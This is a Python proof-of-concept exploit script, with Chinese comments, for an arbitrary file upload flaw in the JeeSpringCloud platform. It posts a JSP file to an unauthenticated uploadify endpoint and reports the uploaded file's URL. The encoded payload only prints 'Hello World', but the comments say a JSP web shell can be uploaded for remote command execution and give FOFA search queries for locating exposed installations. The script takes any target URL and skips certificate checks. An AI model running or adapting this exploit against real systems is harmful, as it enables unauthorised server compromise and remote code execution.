import requests, base64
requests.packages.urllib3.disable_warnings()

'''
    JeeSpringCloud 是一款免费开源的 Java 互联网云快速开发平台，JeeSpringCloud 访问 /static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/ 可上传任意文件。
    获取响应包中的文件名，访问 /static/uploadify/文件名，即可获取任意文件。
    可以上传jsp的shell进行远程命令执行。

    fofa: 
        app="JeeSpringCloud"
        header="com.jeespring.session.id"

    可以通过检测响应头中是否包含"com.jeespring.session.id"判断是否可能存在漏洞
'''

def poc(url, useragent, proxies=None):
        
        headers = {
            'User-Agent': useragent,
            'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundarycdUKYcs7WlAxx9UL',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apn g,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'zh-CN,zh;q=0.9,ja;q=0.8',
            'Connection': 'close'
        }
        payload = base64.b64decode(b'LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5Y2RVS1ljczdXbEF4eDlVTA0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWxlIjsgZmlsZW5hbWU9ImxvZy5qc3AiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KDQo8JSBvdXQucHJpbnRsbigiSGVsbG8gV29ybGQiKTsgJT4NCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWNkVUtZY3M3V2xBeHg5VUwtLQo=')

        path = '/static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/'
        
        try:
            response = requests.post(url=url + path, data=payload, headers=headers, verify=False, proxies=proxies) # 提交payload
            if response.status_code == 200 and 'jsp' in response.text:
                return f'[+] JeeSpringCloud 2023 any file upload exist, Uploaded successfully --> {url}/static/uploadify/{response.text.strip()}'
            else:
                return '[-] JeeSpringCloud 2023 any file upload not exist.'
        except Exception as e:
            return f'[-] An error occurred and it has been logged. error:{e}'
        
if __name__ == '__main__':
    print(poc(input('请输入目标url:').strip('/'), 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'))